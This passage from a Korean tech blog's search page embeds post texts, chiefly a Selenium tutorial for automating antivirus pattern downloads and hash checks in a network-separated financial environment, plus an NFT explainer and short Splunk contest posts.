<!DOCTYPE html>
<html>
<head>

    <!-- Document Settings -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <!-- Base Meta -->
    <!-- dynamically fixing the title for tag/author pages -->



    <title>Search Result</title>
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- Styles'n'Scripts -->
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />

    <!-- custom.css -->
    <link rel="stylesheet" type="text/css" href="/assets/built/custom.css" />

    <!-- 웹 폰트 설정 -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothic.css">

    <!-- awesome icon -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

    <!-- syntax.css -->
    <link rel="stylesheet" href="/assets/built/syntax.css">

    <!-- highlight.js -->
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
    <style>.hljs { background: none; }</style>

    <!--[if IE]>
        <style>
            p, ol, ul{
                width: 100%;
            }
            blockquote{
                width: 100%;
            }
        </style>
    <![endif]-->
    
    <!-- This tag outputs SEO meta+structured data and other important settings -->
    <meta name="description" content="wind-flow Tech Blog" />
    <link rel="shortcut icon" href="https://wind-flow.github.io/assets/built/images/wind-flow.png" type="image/png" />
    <link rel="canonical" href="https://wind-flow.github.io/search" />
    <meta name="referrer" content="no-referrer-when-downgrade" />

     <!--title below is coming from _includes/dynamic_title-->
    <meta property="og:site_name" content="wind-flow Tech Blog" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Search Result" />
    <meta property="og:description" content="wind-flow Tech Blog" />
    <meta property="og:url" content="https://wind-flow.github.io/search" />
    <meta property="og:image" content="https://wind-flow.github.io/assets/images/sevenpuzzle.jpg" />
    <meta property="article:publisher" content="https://www.facebook.com/" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Search Result" />
    <meta name="twitter:description" content="wind-flow Tech Blog" />
    <meta name="twitter:url" content="https://wind-flow.github.io/" />
    <meta name="twitter:image" content="https://wind-flow.github.io/assets/images/sevenpuzzle.jpg" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="wind-flow Tech Blog" />
    <meta name="twitter:site" content="@" />
    <meta name="twitter:creator" content="@" />
    <meta property="og:image:width" content="2000" />
    <meta property="og:image:height" content="666" />

    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Website",
    "publisher": {
        "@type": "Organization",
        "name": "wind-flow Tech Blog",
        "logo": "https://wind-flow.github.io/"
    },
    "url": "https://wind-flow.github.io/search",
    "image": {
        "@type": "ImageObject",
        "url": "https://wind-flow.github.io/assets/images/sevenpuzzle.jpg",
        "width": 2000,
        "height": 666
    },
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://wind-flow.github.io/search"
    },
    "description": "wind-flow Tech Blog"
}
    </script>

    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
    <script type="text/javascript">
    ghost.init({
    	clientId: "ghost-frontend",
    	clientSecret: "f84a07a72b17"
    });
    </script> -->

    <meta name="generator" content="Jekyll 3.6.2" />
    <link rel="alternate" type="application/rss+xml" title="Search Result" href="/feed.xml" />


</head>
<body class="page-template">

    <div class="site-wrapper">
        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
        <!-- < default -->
<!-- The tag above means: insert everything in this file
into the {body} of the default.hbs template -->

<!-- The big featured header, it uses blog cover image as a BG if available -->
<header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
        
            
                <a class="site-nav-logo" href="https://wind-flow.github.io/">wind-flow Tech Blog</a>
            
        
        
            <ul class="nav" role="menu">
  <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
  <li class="nav-about" role="menuitem">
    <a href="/about/">About</a>
  </li>
  <li class="nav-splunk" role="menuitem">
    <a href="/tag/splunk/">splunk</a>
  </li>
  <!-- <li class="nav-python" role="menuitem"><a href="/tag/python/">Python</a></li> -->
  <li class="nav-archive" role="menuitem">
    <a href="/archive.html">All Posts</a>
  </li>
  <li class="nav-archive" role="menuitem">
    <a href="/author_archive.html">Tag별 Posts</a>
  </li>
</ul>

        
    </div>
    <div class="site-nav-right">
        <div class="social-links">
            
            
        </div>
        
            <a class="subscribe-button" href="#subscribe">search</a>
        
    </div>
</nav>

    </div>
</header>

<!-- Everything inside the #post tags pulls data from the post -->
<!-- #post -->

<main id="site-main" class="site-main outer" role="main">
    <div class="inner">

        <article class="post-full  post page no-image">

            <header class="post-full-header">
                <h1 class="post-full-title">Search Result</h1>
            </header>

            

            <section class="post-full-content">
                <form action="/search" method="get" hidden="hidden">
    <label for="search-box"></label>
    <input type="text" id="search-box" name="query">
</form>

<ul class="mylist" id="search-results"></ul>

<script>
    window.store = {
    
    "automation": {
        "title": "파일 다운로드 및 수정 자동화",
            "author": "wind-flow",
            "category": "",
            "content": "개론「전자금융감독규정」제 16조에 따라 백신 엔진 패턴을 항상 최신화 해야합니다.보통의 PC는 인터넷이 연결되어있기 때문에 백신 엔진 패턴이 자동으로 업데이트 되지만, 금융권은 망분리 규정으로인해 인터넷이 불가하기때문에 백신 공식 홈페이지에서 패턴 파일을 직접 다운받아 내부망으로 이동시킨 후 수동으로 업데이트를 해야합니다.매일 하기엔 공수가 많이들어 자동으로 파일을 다운로드 받고, 업로드할 수 있는 자동화 스크립트를 작성해보겠습니다.업무설명  안랩 공식홈페이지에 로그인한다.  패턴 파일을 다운로드 한다.(zip, ahc, exe파일)  다운로드 받은 파일이 이상없는지 무결성 검사를 한다.(hash값 비교)  USB로 옮긴다.구현 전략크롬을 자동으로 띄우고, 로그인 후 다운로드를 받는 기능을 구현해야합니다.위의 기능을 구현하기 위해서는 크롬을 동적으로 다룰 수 있는 셀레니움과 Chrome driver를 사용합니다.셀레니움 ?셀레니움은 웹 애플리케이션 테스트를 위한 프레임워크입니다. 웹 UI, 기능 테스트 뿐 아니라 크롤링에도 많이 사용됩니다.크롬 드라이버 ?크롬 드라이버는 크롬브라우저를 컨트롤 할 수 있게 해주는 파일입니다. 셀레니움으로 크롬 드라이버 기능을 사용하여 크롬 브라우저를 조작할 예정입니다.구현우선 크롬 드라이버를 다운받습니다. 설치된 크롬 버전에 맞는 드라이버를 다운받아야합니다.크롬 버전 확인하기※ 해당 코드는 아래 포스트를 참고하여 작성하였습니다.크롤링으로 업무 자동화  우측상단 더보기 아이콘 클릭 후 설정  크롬 버전정보버전은 98.0.4758.102이므로, 해당버전을 다운받습니다.크롬 다운로드 홈페이지셀레니움 사용하기pip install selenumchromedirver.py 파일을 생성하고, 셀레니움 webdriver를 import 합니다.from selenium import webdriver크롬 조작 인스턴스 정의from selenium import webdriverdef generate_chrome(    driver_path: str,    download_path: str,    headless: bool=False    ) -&gt; webdriver:    \"\"\"    크롭 웹드라이버 인스턴스 생성    :param driver_path: 드라이버 경로    :param download_path: 파일 다운로드 경로    :param headless: headless 옵션 설정 플래그    :return webdriver: 크롬 드라이버 인스턴스    \"\"\"크롬 브라우저 옵션 세팅from selenium import webdriverdef generate_chrome(    driver_path: str,    download_path: str,    headless: bool=False    ) -&gt; webdriver:    \"\"\"    크롭 웹드라이버 인스턴스 생성    :param driver_path: 드라이버 경로    :param download_path: 파일 다운로드 경로    :param headless: headless 옵션 설정 플래그    :return webdriver: 크롬 드라이버 인스턴스    \"\"\"    options = webdriver.ChromeOptions()    if headless:        options.add_argument('headless')        options.add_argument('--disable-gpu')    options.add_experimental_option('prefs', {        'download.default_directory': download_path,        \"profile.default_content_settings.popups\": 0,        \"safebrowsing.enabled\": True    })    chrome = webdriver.Chrome(executable_path=driver_path, options=options)    if headless:        _enable_download_in_headless_chrome(chrome, download_path)    atexit.register(_close_chrome(chrome))       # 스크립트 종료전 무조건 크롬 종료    return chromeheadless : 브라우저 창을 띄우지않고 프로세스를 실행합니다.–disable-gpu : 브라우저가 CPU의 부담을 줄이고자 렌더링 시 GPU를 사용하여 그래픽 가속을 하는데, GPU 버그가 일어날 수 있기때문에 GPU 사용을 disable 시킵니다.download.default_directory: download_path : 다운로드 경로를 download_path로 설정합니다.profile.default_content_settings.popups: 0 : 팝업을 금지합니다.safebrowsing.enabled: True : 세이프 브라우징모드를 킵니다. 이 설정을 하지 않는다면, exe파일 다운로드 받을 때 경고창이 울려 자동으로 다운로드받지 못합니다.def _enable_download_in_headless_chrome(driver: webdriver, download_dir: str):        \"\"\"        headless does not allow file download: https://bugs.chromium.org/p/chromium/issues/detail?id=696481        크롬 드라이버는 크롤링을 이용한 해킹을 예방하기 위해 기본적으로 headless 모드에서 다운로드를 지원하지 않는다.        전문을 먼저 보내야 사용이 가능. 자세한 내용 위 링크 참조        :param driver: 크롬 드라이버 인스턴스        :param download_dir: 파일 다운로드 경로        \"\"\"        driver.command_executor._commands[\"send_command\"] = (\"POST\", '/session/$sessionId/chromium/send_command')        params = {            'cmd': 'Page.setDownloadBehavior',            'params': {                'behavior': 'allow',                'downloadPath': download_dir            }        }        driver.execute(\"send_command\", params)크롬 종료 함수모든 프로세스가 끝나면 크롬을 종료합니다. atexit를 통해 프로세스 종료 직전에 실행됩니다.def _close_chrome(chrome: webdriver):    \"\"\"    크롬 종료    :param chrome: 크롬 드라이버 인스턴스    \"\"\"    def close():        chrome.close()    return close최종적인 chromedriver 코드import atexitfrom selenium import webdriverdef _enable_download_in_headless_chrome(driver: webdriver, download_dir: str):        &quot;&quot;&quot;        headless does not allow file download: https://bugs.chromium.org/p/chromium/issues/detail?id=696481        크롬 드라이버는 크롤링을 이용한 해킹을 예방하기 위해 기본적으로 headless 모드에서 다운로드를 지원하지 않는다.        전문을 먼저 보내야 사용이 가능. 자세한 내용 위 링크 참조        :param driver: 크롬 드라이버 인스턴스        :param download_dir: 파일 다운로드 경로        &quot;&quot;&quot;        driver.command_executor._commands[&quot;send_command&quot;] = (&quot;POST&quot;, &#39;/session/$sessionId/chromium/send_command&#39;)        params = {            &#39;cmd&#39;: &#39;Page.setDownloadBehavior&#39;,            &#39;params&#39;: {                 &#39;behavior&#39;: &#39;allow&#39;,                &#39;downloadPath&#39;: download_dir            }        }        driver.execute(&quot;send_command&quot;, params)def _close_chrome(chrome: webdriver):    &quot;&quot;&quot;    크롬 종료    :param chrome: 크롬 드라이버 인스턴스    &quot;&quot;&quot;    def close():        chrome.close()    return closedef generate_chrome(    driver_path: str,    download_path: str,    headless: bool=False    ) -&gt; webdriver:    &quot;&quot;&quot;    크롭 웹드라이버 인스턴스 생성        :param driver_path: 드라이버 경로    :param download_path: 파일 다운로드 경로    :param headless: headless 옵션 설정 플래그    :return webdriver: 크롬 드라이버 인스턴스    &quot;&quot;&quot;    options = webdriver.ChromeOptions()    if headless:        options.add_argument(&#39;headless&#39;)        options.add_argument(&#39;--disable-gpu&#39;)    options.add_experimental_option(&#39;prefs&#39;, {        &#39;download.default_directory&#39;: download_path,        &#39;download.prompt_for_download&#39;: False,        &quot;profile.default_content_settings.popups&quot;: 0,        &quot;safebrowsing.enabled&quot;: True    })        chrome = webdriver.Chrome(executable_path=driver_path, options=options)    if headless:        _enable_download_in_headless_chrome(chrome, download_path)    atexit.register(_close_chrome(chrome))       # 스크립트 종료전 무조건 크롬 종료    return chrome인스턴스 생성크롬 브라우저 기동 기능은 완료했습니다. 이제 자동화 기능을 구현만 남았습니다.프로젝트/다운로드 경로, 운영체제 판별을 위한 모듈을 import하고, 프로젝트, 다운로드, 드라이버 경로를 설정합니다.그 후 운영체제를 판별하고, 해당 운영체제에 맞는 드라이버를 사용할 수 있도록 설정해줍니다.그 후 크롬 인스턴스를 생성합니다.#!/usr/bin/python# main.pyimport sysimport osimport timeimport subprocessimport shutilfrom chromedriver import generate_chromefrom selenium.webdriver.common.keys import Keysfrom selenium.webdriver.chrome.options import Options# 프로젝트, 다운로드 경로 설정PROJECT_DIR = str(os.path.dirname(os.path.abspath(__file__)))DOWNLOAD_DIR = f'{PROJECT_DIR}\\download'driver_path = f'{PROJECT_DIR}/lib/webDriver/'# 운영체제 판별platform = sys.platformif platform == 'darwin':    print('System platform : Darwin')    driver_path += 'chromedriverMac'elif platform == 'linux':    print('System platform : Linux')    driver_path += 'chromedriverLinux'elif platform == 'win32':    print('System platform : Window')    driver_path += 'chromedriverWindow'else:    print(f'[{sys.platform}] not supported. Check your system platform.')    raise Exception()# 크롬 드라이버 인스턴스 생성chrome = generate_chrome(    driver_path=driver_path,    headless=False,    download_path=DOWNLOAD_DIR)다음은 업무 수행 절차를 코드로 구현하면 됩니다.구현하려면 셀레니움의 메소드 동작방식과 XPath에 대해서 알아야합니다.위 작업을 자동화 하려면 특정 엘리먼트들(버튼, input 등)을 선택하고 입력하고 클릭하는 기능을 python으로 구현해야합니다.셀레니움으로 엘리먼트를 선택하는 문법은 두가지 입니다.하나는 엘리먼트의 attr(id)로 선택하는 방법과 XPath로 선택하는 방법입니다.attr로 선택하는 방법은 보편적이니 따로 설정하지않고, XPath로 선택하는 방법을 소개하겠습니다.chrome.find_element_by_xpath('XPath')XPath는 XML문장 속의 요소, 속성 등을 지정하기 위한 언어입니다.선택할 엘리먼트 태그를 우클릭하면 해당 엘리먼트의 XPath를 얻을 수 있습니다.elm = chrome.find_element_by_xpath('//*[@id=\"root\"]/div/div[2]/div[1]/div[1]/button[1]/span[1]')elm.click()time.sleep(1)elm = chrome.find_element_by_id('id')elm.send_keys('사용할 ID')elm = chrome.find_element_by_id('password')elm.send_keys('사용할 PW')elm.send_keys(Keys.ENTER)  click() : 선택한 엘리먼트를 클릭합니다.  send_keys(a) : 선택한 엘리먼트에 a값을 넣습니다.크롬 인스턴스의 find_element_by_XX 메소드를 이용해 선택할 엘리먼트의 id를 넣고, send_keys 메소드를 이용해 값을 넣어 업무설명에서 소개한 진행절차대로 작업을 수행해줍니다.※ 작업 중간마다 sleep함수를 넣은 이유는, 작업 완료 전에 다음 작업을 수행할 수 있기 때문입니다.파일 다운로드 버튼을 클릭하려면 특정 엘리먼트를 클릭해야 버튼 엘리먼트가 생기는 경우가 있습니다.코드는 아래와 같습니다.# login ~ enter download pageurl = 'https://mycompany.ahnlab.com/'chrome.get(url)time.sleep(1.5)elm = chrome.find_element_by_xpath('//*[@id=\"root\"]/div/div[2]/div[1]/div[1]/button[1]/span[1]')elm.click()time.sleep(1)elm = chrome.find_element_by_id('id')elm.send_keys('[사용할 ID]')elm = chrome.find_element_by_id('password')elm.send_keys('[사용할 PW]')elm.send_keys(Keys.ENTER)time.sleep(1)url = 'https://mycompany.ahnlab.com/download'chrome.get(url)time.sleep(1)elm = chrome.find_element_by_xpath('/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[1]/span')elm.click()time.sleep(1)elm = chrome.find_element_by_xpath('//*[@id=\"k-panelbar-item-default-.0\"]/div/div/div/div/table/tbody/tr[1]/td[1]/span[3]')enginedate = elm.text.replace('.', '')print(enginedate)#exe, zip, ahc file downloadprint(\"open zip ahc\")elm = chrome.find_element_by_xpath('/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[1]/span/p') # zip ahc openelm.click()elm.click()time.sleep(0.5)print(\"download zip file\")elm = chrome.find_element_by_xpath('/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[1]/div/div/div/div/table/tbody/tr[1]/td[2]/a[1]/button') # zip downelm.click()time.sleep(0.5)print(\"download ahc file\")elm = chrome.find_element_by_xpath('/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[1]/div/div/div/div/table/tbody/tr[1]/td[2]/a[2]/button') # ahc downelm.click()time.sleep(0.5)print(\"open hash\")elm = chrome.find_element_by_xpath('/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[1]/div/div/div/div/table/tbody/tr[1]/td[2]/button') # ahcelm.click()time.sleep(0.5)ahnlab_ziphash = chrome.find_element_by_xpath('/html/body/div/div/div/div[3]/div[2]/div/div[5]/div[2]/div[2]/table/tbody/tr[2]/td').texttime.sleep(0.5)print(\"hash close\")elm = chrome.find_element_by_xpath('/html/body/div/div/div/div[3]/div[2]/div/div[5]/div[2]/div[3]/button') # hash closeelm.click()time.sleep(0.5)print(\"open exe\")elm = chrome.find_element_by_xpath('/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[2]/span/p') # exe openelm.click()time.sleep(0.5)print(\"download exe file\")elm = chrome.find_element_by_xpath('/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[2]/div/div/div/div/table/tbody/tr[1]/td[2]/a/button') # exeelm.click()time.sleep(0.5)print(\"open hash\")elm = chrome.find_element_by_xpath('/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[2]/div/div/div/div/table/tbody/tr[1]/td[2]/button') # hash clickelm.click()time.sleep(0.5)파일의 무결성을 검증하기위해 백신업체에서 제공하는 파일의 hash값을 검증하는 과정이 필요합니다. 파일의 hash값을 추출하기위해 sigcheck를 이용하겠습니다.※ sigcheck란?python의 subprocess를 이용해 sigcheck.exe파일을 수행하겠습니다.완료된 파일의 경로를 설정해주고, 10초마다 해당 경로에 파일이 있는지 검사합니다.파일명이 있으면 다운로드 완료된것으로 간주합니다.# download and check file download complete.exepath = f'{PROJECT_DIR}\\download\\\\ahnlabengine_setup.exe'apcpath = f'{PROJECT_DIR}\\download\\\\ahnlabengine_apc.zip'ahcpath = f'{PROJECT_DIR}\\download\\\\ahnlabengine_apc.zip.ahc'print(\"download process....\")while(True) :    if os.path.exists(exepath) and os.path.exists(apcpath) and os.path.exists(ahcpath):        break    time.sleep(10)subprocess를 통해 sigcheck를 실행하고, 다운로드 받은 파일의 hash(SHA256)값을 비교해봅니다.# check hash SHA256sig_exehash = subprocess.check_output(f'{PROJECT_DIR}\\download\\sigcheck64.exe' + \" -h \" + f'{PROJECT_DIR}\\download\\\\ahnlabengine_setup.exe | find \\\"SHA256\\\"', shell=True).strip()sig_apchash = subprocess.check_output(f'{PROJECT_DIR}\\download\\sigcheck64.exe' + \" -h \" + f'{PROJECT_DIR}\\download\\\\ahnlabengine_apc.zip | find \\\"SHA256\\\"', shell=True).strip()print(\"ahnlabZIPHash : \" + (sig_apchash.decode('utf-8')[8:]).capitalize())print(\"ZIPfileHash   : \" + (ahnlab_ziphash).capitalize())print(\"ahnlabEXEHash : \" + (sig_exehash.decode('utf-8')[8:]).capitalize())print(\"EXEfileHash   : \" + (ahnlab_exehash).capitalize())다운로드 받은 파일을 usb에 엔진날짜명의 폴더(ex, 220401)를 생성해 이동시킵니다.# file move to USBos.makedirs(usb_drive + enginedate)shutil.move(ahcpath, usb_drive + enginedate)shutil.move(exepath, usb_drive + enginedate)shutil.move(apcpath, usb_drive + enginedate)전체 코드는 아래와 같습니다.#!/usr/bin/python# main.pyimport sysimport osimport timeimport subprocessimport shutilfrom chromedriver import generate_chromefrom selenium.webdriver.common.keys import Keysfrom selenium.webdriver.chrome.options import OptionsPROJECT_DIR = str(os.path.dirname(os.path.abspath(__file__)))DOWNLOAD_DIR = f&#39;{PROJECT_DIR}\\download&#39;driver_path = f&#39;{PROJECT_DIR}/lib/webDriver/&#39;usb_drive = &#39;E:\\\\&#39;platform = sys.platformif platform == &#39;darwin&#39;:    print(&#39;System platform : Darwin&#39;)    driver_path += &#39;chromedriverMac&#39;elif platform == &#39;linux&#39;:    print(&#39;System platform : Linux&#39;)    driver_path += &#39;chromedriverLinux&#39;elif platform == &#39;win32&#39;:    print(&#39;System platform : Window&#39;)    driver_path += &#39;chromedriverWindow&#39;else:    print(f&#39;[{sys.platform}] not supported. Check your system platform.&#39;)    raise Exception()# 크롬 드라이버 인스턴스 생성    chrome = generate_chrome(    driver_path=driver_path,    headless=False,    download_path=DOWNLOAD_DIR)# login ~ enter download pageurl = &#39;https://mycompany.ahnlab.com/&#39;chrome.get(url)time.sleep(1.5) elm = chrome.find_element_by_xpath(&#39;//*[@id=&quot;root&quot;]/div/div[2]/div[1]/div[1]/button[1]/span[1]&#39;)elm.click()time.sleep(1)elm = chrome.find_element_by_id(&#39;id&#39;)elm.send_keys(&#39;[your ID]&#39;) elm = chrome.find_element_by_id(&#39;password&#39;)elm.send_keys(&#39;[your PW]&#39;) elm.send_keys(Keys.ENTER)time.sleep(1)url = &#39;https://mycompany.ahnlab.com/download&#39;chrome.get(url)time.sleep(1) elm = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[1]/span&#39;)elm.click()time.sleep(1) elm = chrome.find_element_by_xpath(&#39;//*[@id=&quot;k-panelbar-item-default-.0&quot;]/div/div/div/div/table/tbody/tr[1]/td[1]/span[3]&#39;)enginedate = elm.text.replace(&#39;.&#39;, &#39;&#39;)print(enginedate)#exe, zip, ahc file downloadprint(&quot;open zip ahc&quot;)elm = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[1]/span/p&#39;) # zip ahc openelm.click()elm.click()time.sleep(0.5)print(&quot;download zip file&quot;)elm = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[1]/div/div/div/div/table/tbody/tr[1]/td[2]/a[1]/button&#39;) # zip downelm.click()time.sleep(0.5)print(&quot;download ahc file&quot;)elm = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[1]/div/div/div/div/table/tbody/tr[1]/td[2]/a[2]/button&#39;) # ahc downelm.click()time.sleep(0.5)print(&quot;open hash&quot;)elm = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[1]/div/div/div/div/table/tbody/tr[1]/td[2]/button&#39;) # ahcelm.click()time.sleep(0.5)ahnlab_ziphash = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[5]/div[2]/div[2]/table/tbody/tr[2]/td&#39;).texttime.sleep(0.5)print(&quot;hash close&quot;)elm = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[5]/div[2]/div[3]/button&#39;) # hash closeelm.click()time.sleep(0.5)print(&quot;open exe&quot;)elm = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[2]/span/p&#39;) # exe openelm.click()time.sleep(0.5)print(&quot;download exe file&quot;)elm = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[2]/div/div/div/div/table/tbody/tr[1]/td[2]/a/button&#39;) # exeelm.click()time.sleep(0.5)print(&quot;open hash&quot;)elm = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[4]/div[2]/div/div/div/div/table/tbody/tr[1]/td[2]/button&#39;) # hash clickelm.click()time.sleep(0.5)ahnlab_exehash = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[5]/div[2]/div[2]/table/tbody/tr[2]/td&#39;).textprint(  &#39;zip SHA256: &#39; + ahnlab_ziphash,         &#39;exe SHA256: &#39; + ahnlab_exehash)print(&quot;hash close&quot;)elm = chrome.find_element_by_xpath(&#39;/html/body/div/div/div/div[3]/div[2]/div/div[5]/div[2]/div[3]/button&#39;) # hash closeelm.click()time.sleep(1)# download and check file download complete.exepath = f&#39;{PROJECT_DIR}\\download\\\\ahnlabengine_setup.exe&#39;apcpath = f&#39;{PROJECT_DIR}\\download\\\\ahnlabengine_apc.zip&#39;ahcpath = f&#39;{PROJECT_DIR}\\download\\\\ahnlabengine_apc.zip.ahc&#39;print(&quot;download process....&quot;)    while(True) :    if os.path.exists(exepath) and os.path.exists(apcpath) and os.path.exists(ahcpath):        break    time.sleep(10)# check hash SHA256sig_exehash = subprocess.check_output(f&#39;{PROJECT_DIR}\\download\\sigcheck64.exe&#39; + &quot; -h &quot; + f&#39;{PROJECT_DIR}\\download\\\\ahnlabengine_setup.exe | find \\&quot;SHA256\\&quot;&#39;, shell=True).strip()sig_apchash = subprocess.check_output(f&#39;{PROJECT_DIR}\\download\\sigcheck64.exe&#39; + &quot; -h &quot; + f&#39;{PROJECT_DIR}\\download\\\\ahnlabengine_apc.zip | find \\&quot;SHA256\\&quot;&#39;, shell=True).strip()print(&quot;ahnlabZIPHash : &quot; + (sig_apchash.decode(&#39;utf-8&#39;)[8:]).capitalize())print(&quot;ZIPfileHash   : &quot; + (ahnlab_ziphash).capitalize())print(&quot;ahnlabEXEHash : &quot; + (sig_exehash.decode(&#39;utf-8&#39;)[8:]).capitalize())print(&quot;EXEfileHash   : &quot; + (ahnlab_exehash).capitalize())# file move to USBos.makedirs(usb_drive + enginedate)shutil.move(ahcpath, usb_drive + enginedate)shutil.move(exepath, usb_drive + enginedate)shutil.move(apcpath, usb_drive + enginedate)github 주소(https://github.com/wind-flow/avdownload)",
        "url": "/automation"
    }
    ,
    
    "definition-nft": {
        "title": "NFT란?",
            "author": "wind-flow",
            "category": "",
            "content": "NFT의 정의NFT는 Non-Fungible Token의 약자로, 한국어로는 대체 불가능한 토큰을 뜻합니다.NFT를 이해하기위해선 Fungible의 뜻을 이해해야 합니다.NFT의 개념Fungible : &lt;재화가&gt; 대체(代替) 가능의, (딴것으로) 대신할 수 있는의 의미를 갖고 있습니다.만원을 예를 들면 제가 갖고있던, 누군가 갖고있던, 반으로 접히던, 일련번호가 다르던 만원의 가치를 갖고 있습니다.하지만 1998년에 발행된 500원짜리가 100만원에 거래 되었습니다. “500원 동전 100만 원에 삽니다” 중고거래 ‘금값’된 희귀 화폐, 대구일보이 사례의 500원 주화는 더이상 화폐의 의미보단 대체할 수 없는(=희소성이 있는) 자산으로 볼 수 있습니다.이를 디지털화 시키고, 동일한 자산을 만들 수 없는 자산을 Non-Fungible한 속성을 가졌다고 말할 수 있습니다.NFT의 원리 및 특징NFT를 알기위해 이더리움의 스마트 컨트랙트 기능을 알아야합니다.기존 계약 이행의 주체는 당사자이지만, 스마트 컨트랙트는 계약서에 명시된 조건(스크립트)이 충족될때 대가가 지불됩니다.스마트 컨트랙트 기능을 이용해 비용(이더리움)이 지급 시 대가(사진, 동영상, 음성 등을 지칭한 파일 등을 포함)를 해당 자산의 일련번호를 채번하여 토큰 형태로 발행해 주는데, 이때 발행된 토큰이 NFT입니다.NFT의 특징은 다음과 같습니다.      희소성만든 자산에 일련번호를 채번해 복제와 위조가 거의 불가능하기 때문에 희소성이 있습니다.        추적하기 쉬움블록체인 기반의 기술이므로 출처, 발행 시간, 거래 내역, 소유자 등을 확인하기 쉽습니다.        소유권 인정공유 네트워크에 블록체인 방식으로 저장하기 때문에 소유권을 증명할 수 있습니다. 토큰을 이용해 소유권을 분할할 수도 있습니다.또한 거래를 자유롭게 할 수 있습니다.  요약하자면, NFT는 온라인에서 재산권을 주장할 수 있는 기술입니다.NFT의 응용 사례NFT는 재산권을 증명하는데 쓰입니다.  트위터 NFT 구매  간송미술관 NFT  엑시 인피니티(Axie Infinity)NFT 거래 방법NFT거래소를 방문합시다.OpenSea1. 지갑만들기NFT를 담을 지갑을 만듭니다.저는 가장 유명한 MetaMask를 골랐습니다.생성하면 이와같이나오는데, 지갑생성을 클릭합니다.그 후 사용자 동의하고 암호를 설정합니다.암호를 설정하면 암호를 잊어버렸을 시 찾을 수 있는 시드구문을 조회할 수 있는 페이지가 나옵니다.이 시드 구문으로 암호를 찾을 수 있으니 절대 노출되어선 안됩니다. 계좌번호와 암호는 절대 잊어서는 안됩니다 Meta-Mask계정을 만들었으면 OpenSae에 로그인합시다.2. 계좌 입금계좌에 자금이 있어야 NFT거래를 할 수 있습니다.다른 암호화폐 거래소에서 이체하는 방법과 블록체인기반 국제송금업체인 와이어를 통해 현금으로 이더리움을 구매할 수 있습니다.3-1. NFT 구매탐색하기(Explore)버튼을 눌러 현재 올라와있는 자산을 살펴봅니다.좌측 상단을 보면 지금 구매하기(Buy Now)와 경매 중(On Auction)을 볼 수 있습니다.게시글을 클릭하면 아래와 같은 화면이 뜹니다.가격은 0.03ETH, 수수료는 137.18$를 지불하면 블록체인 네트워크에 방금 수행했던 거래 기록이 남습니다.3-2. NFT 판매내가 만들 NFT를 올리려면 우측 상단 Create를 눌러봅시다.아래와 같은 화면이 뜹니다.여기서 내가 올릴 파일을(제한 100MB)올리고, 필요한 정보를 기입한 후 Create버튼을 누르면 NFT가 생성됩니다.      참고    게임아이템과 NFT의 차이? 전당포 가보면 알 수 있죠‘대세’ 된 NFT, 사고파는 법 제일 쉽게 이해하기 | 이일호 기자, BloterTV손쉽게 NFT 거래하기  ",
        "url": "/Definition-NFT"
    }
    ,
    
    "splunk-soar-rookie": {
        "title": "splunk4Rookie:Soar",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk4Rookie: SOAR",
        "url": "/splunk-SOAR-rookie"
    }
    ,
    
    "splunk-2021-bots-end": {
        "title": "splunk 2021 bots 결과",
            "author": "wind-flow",
            "category": "",
            "content": "2021 BOTS 결과신청정보팀 6등(34개팀)개인 9등(52명)2022년에는 1등을 목표로..!",
        "url": "/splunk-2021-BOTS-END"
    }
    ,
    
    "splunk-bots-v3-part4": {
        "title": "splunk-bots-v3 write up(4) - END",
            "author": "wind-flow",
            "category": "",
